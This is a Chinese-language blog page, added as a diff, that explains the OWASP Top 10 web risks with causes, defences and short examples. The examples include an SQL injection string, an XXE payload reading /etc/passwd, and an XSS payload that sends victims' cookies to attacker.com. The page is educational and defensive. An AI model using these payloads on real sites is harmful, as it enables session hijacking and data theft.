@@ -1,0 +1,245 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>什么是OWASP TOP10 | 百年大佬</title><script src="https://cdn.bootcss.com/valine/1.4.4/Valine.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="百年大佬" type="application/atom+xml">
+</head><body><header><nav><a href="/">主页</a><a href="/archives/">归档</a><a href="/about/">关于</a></nav></header><main><article><div id="post-bg"><div id="post-title"><div id="post-info"><span>date:<time datetime="2021-03-15T02:31:45.530Z" id="date"> 2021-03-15</time></span><br><span>updated:<time datetime="2021-03-17T11:49:52.236Z" id="updated"> 2021-03-17</time></span></div><h1>什么是OWASP TOP10</h1><hr></div><div id="post-content"><h1 id="什么是OWASP"><a href="#什么是OWASP" class="headerlink" title="什么是OWASP"></a>什么是OWASP</h1><blockquote>
+<p>OWASP(Open Web Application Security Project)  是一个在线社区，主要在Web应用程序安全领域中提供文章，方法论，文档，工具和技术。OWASP Top 10列出了公认的最具有威胁性的Web应用安全漏洞。</p>
+</blockquote>
+<details>
+  <summary>Top 10 Web Application Security Risks</summary>
+  <pre><code>
+1.Injection. Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.
+2.Broken Authentication. Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently.
+3.Sensitive Data Exposure. Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data may be compromised without extra protection, such as encryption at rest or in transit, and requires special precautions when exchanged with the browser.
+4.XML External Entities (XXE). Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks.
+5.Broken Access Control. Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users’ accounts, view sensitive files, modify other users’ data, change access rights, etc.
+6.Security Misconfiguration. Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information. Not only must all operating systems, frameworks, libraries, and applications be securely configured, but they must be patched/upgraded in a timely fashion.
+7.Cross-Site Scripting XSS. XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.
+8.Insecure Deserialization. Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.
+9.Using Components with Known Vulnerabilities. Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.
+10.Insufficient Logging & Monitoring. Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.
+</code></pre>
+</details>
+
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="Top1-注入"><a href="#Top1-注入" class="headerlink" title="Top1-注入"></a>Top1-注入</h3><p>当用户发送不可信地数据到解释器的时候，就可能出现注入漏洞，比如<code>SQL</code>, <code>NoSQL</code>,<code> LDAP</code>注入，解释器可能会将用户发送的恶意数据视为指令或数据库查询，使得用户在没有权限的情况下访问数据，甚至导致用户完全控制服务器。</p>
+<p>漏洞原因：</p>
+<ol>
+<li>用户数据没有被验证，过滤，净化。</li>
+<li>恶意数据被直接使用或拼接到正常指令上，导致传入的SQL命令中包含恶意数据</li>
+<li>在没有使用<code>context-aware escaping</code>的情况下，动态询问和非参数化调用被解释器直接使用</li>
+<li>恶意数据被直接使用到对象关系映射<code>object-relational mapping</code>,<code>ORM</code>中</li>
+</ol>
+<p>避免方法</p>
+<ol>
+<li>使用安全API，参数化的借口和ORM工具</li>
+<li>使用输入白名单</li>
+<li>对特定的解释器，转义所有特殊字符。</li>
+<li>使用<code>LIMIT</code>等语句避免数据大量泄漏</li>
+<li>开启SQL自带的保护模块</li>
+</ol>
+<p>例子</p>
+<p><code>string query = &quot;SELECT * FROM accounts WHERE custID=&#39;&quot;+request.getParameter(&quot;id&quot;)+&quot;&#39;&#39;&quot;;</code></p>
+<p>当我们参数输入 <code>id=&#39;or&#39;1&#39;=&#39;1</code>,就会导致用户获得整个表</p>
+<h3 id="Top2-失效身份验证和会话管理"><a href="#Top2-失效身份验证和会话管理" class="headerlink" title="Top2-失效身份验证和会话管理"></a>Top2-失效身份验证和会话管理</h3><p>应用中负责认证和会话管理的部分没有正确实现功能，使得泄露密码，口令或令牌。进而获取到其他用户的身份信息。</p>
+<p>漏洞原因：</p>
+<ol>
+<li>允许自动化的攻击，如凭据填充（<code>credential stuffing</code>，撞库）攻击</li>
+<li>允许爆破等攻击</li>
+<li>允许默认密码，弱口令，等简易密码</li>
+<li>使用弱，或无效的凭证恢复，和忘记密码策略</li>
+<li>使用明文，或加密弱hash的密码</li>
+<li>使用损坏的或无效的多因子认证</li>
+<li>在URL中暴露会话ID</li>
+<li>在成功登陆后没有轮换会话ID</li>
+<li>没有及时把会话ID，验证令牌无效化</li>
+</ol>
+<p>避免方法：</p>
+<ol>
+<li>实现多因子认证以阻止自动化攻击和凭据重用</li>
+<li>避免使用默认密码</li>
+<li>进行弱密码检测</li>
+<li>对齐密码长度，复杂度</li>
+<li>确保注册，凭据恢复和API加固以抵御账户枚举攻击</li>
+<li>限制或延迟失败的登陆尝试，并记录所有的失败尝试并在多次触发后发出警报</li>
+<li>使用服务端，安全内置的会话管理系统，每次会话都要生成随机ID，并在退出会话后及时销毁ID，且会话ID不应显示在URL中</li>
+</ol>
+<p>例子</p>
+<p>用户登录后没有退出，只是关掉了浏览器，再次使用相同浏览器，且会话没有及时被销毁，就能访问。</p>
+<h3 id="Top3-敏感信息泄露"><a href="#Top3-敏感信息泄露" class="headerlink" title="Top3-敏感信息泄露"></a>Top3-敏感信息泄露</h3><p>许多web应用和API没有设置很好的安全措施，导致数据滥用，泄露。如金融，医疗等行业，攻击者可以利用这些行业系统中的数据接口，以偷取，修改这些数据，从而发生身份窃取，信用卡诈骗等。敏感数据应在传输过程和保存过程中使用更加安全的措施来避免泄露。</p>
+<p>漏洞原因：</p>
+<ol>
+<li>使用弱密码算法</li>
+<li>数据明文传输</li>
+<li>数据明文储存</li>
+<li>使用默认密码，重用密码</li>
+<li>没有安全措施</li>
+<li>用户端没有验证接收的服务器凭证是否有效</li>
+</ol>
+<p>避免方法</p>
+<ol>
+<li>将数据分类储存，区分敏感数据</li>
+<li>分类控制数据，对不同级别的数据实行不同级别的安全措施</li>
+<li>确保使用强加密算法进行密码加密，使用合适的密钥管理</li>
+<li>确保数据传输过程中的加密</li>
+<li>包含敏感数据的响应不进行缓存</li>
+<li>独立验证配置有效性</li>
+<li>尽量不存储敏感数据</li>
+</ol>
+<p>例子</p>
+<p>攻击者通过将链接从https降级为http，拦截用户发送包，偷取其中cookie，进行重放攻击，劫持会话，从而获取用户隐私信息。他们也可以直接修改传输的包中数据。</p>
+<h3 id="Top4-XML外部实体注入攻击（XXE）"><a href="#Top4-XML外部实体注入攻击（XXE）" class="headerlink" title="Top4-XML外部实体注入攻击（XXE）"></a>Top4-XML外部实体注入攻击（XXE）</h3><p>许多老版本或弱配置的XML解析器会在处理XML文件内的外部实体时，会去运行其中插入的代码。外部实体可以使用文件URI（统一资源标志符）关闭系统内部正在运行的文件，导致无法提供功能</p>
+<p>漏洞原因：</p>
+<ol>
+<li>应用接受XML或XML上传，或向XML中插入了不可信数据。</li>
+<li>XML解析器或基于SOAP的服务器启用了DTD（Document Type Definition，文档类型定义）</li>
+<li>SAML（安全断言标记语言，基于XML的身份验证）被用于实体处理</li>
+<li>使用1.2版本之前的SOAP，它可能容易受到XXE攻击，如果XML被直传给SOAP的话</li>
+<li>易受XXE攻击的服务器会受到<code>billion laughs attack</code>之类的Dos攻击</li>
+</ol>
+<p>避免方法</p>
+<ol>
+<li>尽可能使用JSON之类的简单数据格式，不序列化敏感数据。</li>
+<li>及时打补丁，升级XML解析器以及使用的库，使用<code>Dependency-check</code>之类的工具。升级SOAP到<code>1.2</code>及更高</li>
+<li>在解析器中禁用XML外部实体和DTD</li>
+<li>使用服务器端输入白名单，过滤，格式化来避免XML文件中的恶意数据</li>
+<li>验证XML和XSL文件上传功能中是否使用XSD（XML Schema Definition） 以及类似的验证功能</li>
+<li>SAST检测源码中的XXE</li>
+<li>使用虚拟补丁，API安全网关，WAF等手段</li>
+</ol>
+<p>例子</p>
+<?xml version="1.0" encoding="ISO-8859-1"?><p> </p>
+<!DOCTYPE foo [ 
+<!ELEMENT foo ANY ><p><br><!ENTITY xxe SYSTEM "file:///etc/passwd" >]&gt;<br><foo>&xxe;</foo> </p>
+<h3 id="Top5-失效访问控制"><a href="#Top5-失效访问控制" class="headerlink" title="Top5-失效访问控制"></a>Top5-失效访问控制</h3><p>认证用户权限的限制往往没有比较好地配置，这导致攻击者能够利用这些缺陷访问未授权的功能和数据。</p>
+<p>漏洞原因：</p>
+<ol>
+<li>通过修改URL，内部应用状态，HTML页面绕过访问控制检查</li>
+<li>允许查看和编辑其他用户的账号</li>
+<li>提权</li>
+<li>元数据操纵，比如重放伪造JWT token，cookie或隐藏的用于提权的域，或破坏JWT无效机制</li>
+<li>CORS（Cross-Origin Resource Sharing）错误配置允许未授权的API访问</li>
+<li>强制浏览未授权的页面，API没有进行访问控制</li>
+</ol>
+<p>避免方法：</p>
+<ol>
+<li>只可访问公共资源，其余默认禁止访问</li>
+<li>实现访问控制机制并在系统内到处重用，最小化CORS可用程度</li>
+<li>模型访问控制应该强制记录拥有权，而不是用户都能增删查改每一条记录</li>
+<li>禁止列出WEB服务器目录，确保元数据和备份文件不在根目录</li>
+<li>记录访问控制失败，多次失败告知管理员</li>
+<li>限制访问API的频率，最小化自动攻击工具的损害</li>
+<li>JWT token应在登出后立刻失效</li>
+</ol>
+<p>例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">pstmt.setString(<span class="hljs-number">1</span>, request.getParameter(<span class="hljs-string">&quot;acct&quot;</span>)); <br>ResultSet results = pstmt.executeQuery( ); <br></code></pre></td></tr></table></figure>
+
+<p>攻击者只需在浏览器中<code>acct</code>修改为任意用户名即可实现攻击</p>
+<h3 id="Top6-安全性错误配置"><a href="#Top6-安全性错误配置" class="headerlink" title="Top6-安全性错误配置"></a>Top6-安全性错误配置</h3><p>安全性错误配置是一种非常常见的问题，网站管理员往往会保留默认配置，这导致了很多安全性问题。系统，应用，框架，库不止应该被安全地配置，他们还应该被及时更新。</p>
+<p>漏洞原因：</p>
+<ol>
+<li>在应用栈中任意一处没有安全加固，云服务器授权没有正确配置</li>
+<li>非必要的特性被启用或安装</li>
+<li>默认账户和密码没有改变</li>
+<li>错误处理泄露出了栈追踪，或其他包含信息过多的错误消息被泄露给了用户</li>
+<li>可升级的系统中最新的安全特性没有被启用或正确配置</li>
+<li>应用服务器，应用框架，库，数据库中的安全设置没有被设为安全值。</li>
+<li>服务器没有发送安全头或指令，或是他们呢没有被正确设置</li>
+<li>软件过时了，易受攻击</li>
+</ol>
+<p>避免方法：</p>
+<ol>
+<li>可重复的加固程序，能够更快，更容易地部署环境。确保开发，QA,生产环境配置完全相同，但使用不同的凭据。这</li>
+<li>个程序应该自动化，以最小化安装安全环境地代价。</li>
+<li>最小的平台，不包含任何非必须地特性，组件，文档。</li>
+<li>包管理工具中检查并更新安全配置</li>
+<li>分段应用结构，使用分段，容器化，云安全组等手段分开组件和用户。</li>
+<li>发送安全指令到客户端</li>
+<li>使用自动化进程以验证所有环境中配置的有效性</li>
+</ol>
+<p>例子</p>
+<p>应用服务器中带有案例应用。这些应用中带有攻击者已知的安全漏洞，如果其中一个是admin命令行，默认账号没有修改，攻击者就可以控制服务器。</p>
+<h3 id="Top7-Cross-Site-Scripting（XSS）"><a href="#Top7-Cross-Site-Scripting（XSS）" class="headerlink" title="Top7-Cross-Site-Scripting（XSS）"></a>Top7-Cross-Site-Scripting（XSS）</h3><p>XSS漏洞出现在当web页面包含不可信的数据，却没有合适的验证手段来找到它的时候。XSS使得攻击者能够在受害者的浏览器中执行脚本，从而劫持会话，或重定向到恶意站点。</p>
+<p>漏洞成因:</p>
+<ol>
+<li>反射型XSS：应用或API包括未验证的或非转义的用户输入作为HTML的输出的一部分。成功的攻击能够使得攻击者在受害者的浏览器上执行任意HTML和JavaScript。</li>
+<li>存储型XSS：应用或API存储未格式化的用户输入，且该输入之后会被其他用户或管理员浏览到。</li>
+<li>DOM XSS：动态包含攻击者可控制数据到页面中的JavaScript框架， 单页应用，API易受DOM XSS。</li>
+</ol>
+<p>避免方法：</p>
+<ol>
+<li>使用自动转义XSS的框架，比如React JS。学习每种框架的XSS保护，并手动处理用例没有覆盖到的部分。</li>
+<li>转义不可信的HTTP请求数据能够解决反射型和存储型XSS威胁。</li>
+<li>在客户端修改浏览器文档时应用内容敏感的编码以抵御DOM XSS。或使用相似的内容敏感转义技术。</li>
+<li>启用CSP(Content Security Policy),这是一种对抗XSS的纵深防御弥补控制。</li>
+</ol>
+<p>例子</p>
+<p><code>(String) page += &quot;&lt;input name=&#39;creditcard&#39; type=&#39;TEXT&#39; value=&#39;&quot; + request.getParameter(&quot;CC&quot;) + &quot;&#39;&gt;&quot;; </code>攻击者只需要把CC参数修改为<code>&#39;&gt;&lt;script&gt;document.location= &#39;http://www.attacker.com/cgi-bin/cookie.cgi? foo=&#39;+document.cookie&lt;/script&gt;&#39;</code>就会使受害者的Cookie发送到攻击者的网站，进而劫持会话。</p>
+<h3 id="Top8-不安全的反序列化"><a href="#Top8-不安全的反序列化" class="headerlink" title="Top8-不安全的反序列化"></a>Top8-不安全的反序列化</h3><p>不安全的反序列化经常会导致远程代码执行。也能用于进行重放攻击，注入攻击，提权攻击。</p>
+<p>漏洞原因：</p>
+<ol>
+<li>对象和数据结构相关攻击：当存在类能够在反序列化过程中或是之后改变应用表现，攻击者就能通过这个类修改应用逻辑，或实现任意远程代码执行。</li>
+<li>典型数据篡改攻击：如访问控制相关攻击，当数据结构存在而内容又能被修改</li>
+</ol>
+<p>避免方法：</p>
+<p>唯一的安全模式是不接受来自不可信的参与者的序列化对象。如果不得不接受，使用以下策略：</p>
+<ol>
+<li>对任何序列化对象进行完整性检测，比如数字签名以防止数据篡改或恶意对象。</li>
+<li>在反序列化过程中强制严格的类型限制。</li>
+<li>在低权限环境中独立运行反序列化代码</li>
+<li>记录反序列化异常和错误，比如收到的类型并不是期望的类型。</li>
+<li>限制或监管入的和出的来自反序列化的容器或服务器的网络链接</li>
+<li>监管反序列化，当用户一直反序列化时报警。</li>
+</ol>
+<p>例子：</p>
+<p><code>a:4:&#123;i:0;i:132;i:1;s:7:&quot;Mallory&quot;;i:2;s:4:&quot;user&quot;; i:3;s:32:&quot;b6a8b3bea87fe0e05022f8f3c88bc960&quot;;&#125; </code><br>若某站点使用如上数据结构保存cookie，攻击者可以将cookie修改为下形式</p>
+<p><code>a:4:&#123;i:0;i:1;i:1;s:5:&quot;Alice&quot;;i:2;s:5:&quot;admin&quot;; i:3;s:32:&quot;b6a8b3bea87fe0e05022f8f3c88bc960&quot;;&#125;</code><br>如果Alice是管理员，且密码为攻击者命中，攻击者就会得到管理员权限。</p>
+<h3 id="Top9-使用具有已知漏洞的组件"><a href="#Top9-使用具有已知漏洞的组件" class="headerlink" title="Top9-使用具有已知漏洞的组件"></a>Top9-使用具有已知漏洞的组件</h3><p>库，框架等软件组件和应用有着相同的权限。如果存在有漏洞的组件，那么攻击就能导致数据泄露甚至控制服务器。组件中的漏洞会导致整个应用和API安全性的下降。</p>
+<p>漏洞原因：</p>
+<ol>
+<li>管理员不知道使用的所有组件的版本，包括直接使用的和嵌套的</li>
+<li>软件易受攻击，不再支持，或是过时了。包括OS, web服务器，DBMS，APIs和所有组件，运行时环境，库。</li>
+<li>没有周期性扫描漏洞，没有关注所使用组件的安全公告。</li>
+<li>没有及时修复或升级平台，框架，依赖。</li>
+<li>软件开发者没有测试升级，更新，补丁的兼容性</li>
+</ol>
+<p>避免方法：</p>
+<ol>
+<li>移除不再使用的依赖，不必须的特性，组件，文件，文档</li>
+<li>持续地列出目前之用的组件和依赖地版本，使用诸如DependencyCheck 之类的工具。持续关注CVE, NVD上的关于对</li>
+<li>应组件的漏洞。使用SCA(software composition analysis)自动化这个过程，订阅关于所使用组件的邮件通知。</li>
+<li>只从官方来源得到组件，签名的包更好。</li>
+<li>关注不再维护的库和组件，如果打补丁不再可能，考虑部署虚拟补丁。</li>
+</ol>
+<p>例子：</p>
+<p>大部分IoT设备很难打补丁</p>
+<h3 id="Top10-日志记录和监控不足"><a href="#Top10-日志记录和监控不足" class="headerlink" title="Top10-日志记录和监控不足"></a>Top10-日志记录和监控不足</h3><p>日志和监控不足，再加上缺失或无效的事件响应，允许攻击者进一步攻击系统，他可以转向更多系统，进行篡改，提取，销毁数据。大部分研究表明违反往往会在超过200天后才被检测出来，而且还是由外部参与者检测到的。</p>
+<p>漏洞原因：</p>
+<ol>
+<li>可审计的事件，比如登录，登录失败没有被记录。</li>
+<li>警告和错误没有产生足够的，清晰的日志消息</li>
+<li>应用和API关于可疑活动的日志没有被监管。</li>
+<li>日志只本地存储</li>
+<li>没有设置合适的警告阈值和响应升级流程</li>
+<li>渗透测试和扫描工具没有触发警告。</li>
+<li>应用无法实时检测，或对攻击做出警告</li>
+</ol>
+<p>避免方法：</p>
+<ol>
+<li>确保登录，访问控制失败，服务断输入验证失败等事件会被日志记录，同时记录足够多的用户上下文以确定可疑账号。保存足够长的时间以用于分析。</li>
+<li>确保日志以一定格式生成，便于日志管理。</li>
+<li>确保高额转账带有审计跟踪和完整性控制以避免篡改或删除</li>
+<li>建立有效的监管和报警机制，使得可疑活动被及时检测和响应。</li>
+<li>建立事件响应和恢复计划。</li>
+</ol>
+<p>例子：</p>
+<p>攻击者用常用密码撞库，每个账户只登录失败一次，如果没有合适的报警机制就会忽视。<br>恶意软件检测沙盒报警了很多次确没有引起重视，最后因为盗刷银行卡被察觉。</p>
+<div id="paginator"></div></div><div id="post-footer"><hr><a href="/2020/10/28/%60%60%60/">这是标题 Next →</a><hr></div><div id="bottom-btn"><a id="to-index" href="#post-index" title="index">≡</a><a id="to-top" href="#post-title" title="to top">∧</a></div><div id="Valine"></div><script>new Valine({
+ el: '#Valine'
+ , appId: ''
+ , appKey: ''
+ , placeholder: '此条评论委托企鹅物流发送'
+})</script></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/3.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://github.com/Srkito/"> Dr.Srkito</a></h1><section id="total"><a id="total-archives" href="/archives"><span class="total-title">Archives Total:</span><span class="total-number">4</span></a><div id="total-tags"><span class="total-title">Tags:</span><span class="total-number">3</span></div><div id="total-categories"><span class="total-title">Categories:</span><span class="total-number">3</span></div></section></div><div id="aside-block" style="order: -1"><h1>INDEX</h1><div id="post-index"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFOWASP"><span class="toc-number">1.</span> <span class="toc-text">什么是OWASP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Top1-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">Top1-注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Top2-%E5%A4%B1%E6%95%88%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E5%92%8C%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86"><span class="toc-number">1.1.2.</span> <span class="toc-text">Top2-失效身份验证和会话管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Top3-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.3.</span> <span class="toc-text">Top3-敏感信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Top4-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%88XXE%EF%BC%89"><span class="toc-number">1.1.4.</span> <span class="toc-text">Top4-XML外部实体注入攻击（XXE）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Top5-%E5%A4%B1%E6%95%88%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">1.1.5.</span> <span class="toc-text">Top5-失效访问控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Top6-%E5%AE%89%E5%85%A8%E6%80%A7%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.6.</span> <span class="toc-text">Top6-安全性错误配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Top7-Cross-Site-Scripting%EF%BC%88XSS%EF%BC%89"><span class="toc-number">1.1.7.</span> <span class="toc-text">Top7-Cross-Site-Scripting（XSS）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Top8-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.8.</span> <span class="toc-text">Top8-不安全的反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Top9-%E4%BD%BF%E7%94%A8%E5%85%B7%E6%9C%89%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%BB%84%E4%BB%B6"><span class="toc-number">1.1.9.</span> <span class="toc-text">Top9-使用具有已知漏洞的组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Top10-%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%92%8C%E7%9B%91%E6%8E%A7%E4%B8%8D%E8%B6%B3"><span class="toc-number">1.1.10.</span> <span class="toc-text">Top10-日志记录和监控不足</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr><span class="text-title">©</span><span class="text-content">2018 to 2118</span></nobr><wbr><nobr><p class="text-title">ICP</p><a class="text-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn">豫ICP备19016218号&nbsp;</a></nobr><wbr><nobr>published with&nbsp;<a target="_blank" rel="noopener" href="http://hexo.io">Hexo&nbsp;</a></nobr><wbr><nobr>Theme&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight&nbsp;</a></nobr><wbr><nobr>by&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/arknights.js"></script><script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/highlight.min.js"></script></body></html>
